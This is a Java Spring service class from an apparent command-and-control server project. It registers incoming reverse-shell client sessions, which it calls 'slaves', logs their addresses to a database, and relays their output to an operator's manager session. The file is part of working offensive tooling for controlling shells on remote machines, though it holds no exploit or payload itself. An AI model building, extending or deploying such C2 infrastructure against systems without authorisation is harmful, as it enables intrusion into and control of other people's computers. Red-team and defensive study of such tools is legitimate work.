package com.mtattab.c2cServer.service.impl;

import com.mtattab.c2cServer.model.ManagerCommunicationModel;
import com.mtattab.c2cServer.model.entity.SessionLogEntity;
import com.mtattab.c2cServer.repository.SessionLogRepository;
import com.mtattab.c2cServer.service.ActiveSessionsObserver;
import com.mtattab.c2cServer.service.ReverseShellClientHandlerService;
import com.mtattab.c2cServer.service.observable.ActiveSessionsObservable;
import com.mtattab.c2cServer.util.ConnectionManager;
import com.mtattab.c2cServer.util.DataManipulationUtil;
import com.mtattab.c2cServer.util.SocketUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.sql.Timestamp;
import java.time.LocalDateTime;
import java.util.Set;

@Service
@Slf4j
public class ReverseShellClientHandlerServiceImpl implements ReverseShellClientHandlerService {

    @Autowired
    ActiveSessionsObservable activeSessionsObservable;
    @Autowired
    SessionLogRepository sessionLogRepository;

    public void addActiveSession(WebSocketSession session){
        if (!activeSessionsObservable.getActiveReverseShellSessions().contains(session)){
            activeSessionsObservable.addReverseShellSession(session);
            logSessionInDb(session);
        }
    }

    public void removeActiveSession(WebSocketSession session){
        activeSessionsObservable.removeReverseShellSession(session);
        logSessionOutInDb(session);

    }

    private void logSessionInDb(WebSocketSession session){
        try {
            sessionLogRepository.save(SessionLogEntity.builder()
                    .sessionId(session.getId())
                    .sessionLocalAddress(session.getLocalAddress().toString())
                    .sessionRemoteAddress(session.getRemoteAddress().toString())
                    .sessionCreatedAt(Timestamp.valueOf(LocalDateTime.now()))
                    .build());
        }catch (Exception e){
            log.error("[-] exception occurred while saving session: {}",e.getMessage());
            e.printStackTrace();
        }
    }
    private void logSessionOutInDb(WebSocketSession session){
        try {
            sessionLogRepository.updateSessionToClosed(Timestamp.valueOf(LocalDateTime.now()), session.getId());
        }catch (Exception e){
            log.error("[-] exception occurred while removing session: {}",e.getMessage());
            e.printStackTrace();
        }
    }




    public void handleReverseShellClient(WebSocketSession session, TextMessage message) throws IOException {
        String clientMessage = message.getPayload();
//        ManagerCommunicationModel managerCommunicationModel= DataManipulationUtil.jsonToObject(clientMessage, ManagerCommunicationModel.class);

        // Handle the client's message (e.g., send a response back to the client)
        String responseMessage =  clientMessage;
        System.out.println(responseMessage);

        WebSocketSession mangerSession = ConnectionManager.connectedReverseToManagerSessions.get(session);
        if (mangerSession!=null){


            SocketUtil.sendMessage(mangerSession, new TextMessage(
                    DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                            .msg(responseMessage)
                            .slaveSessionId(session.getId())
                            .build()
                    )));
        }else {
            session.sendMessage(new TextMessage(responseMessage));

        }


//        if (managerCommunicationModel!= null){
//            System.out.println(managerCommunicationModel);
//
//        }

    }


}
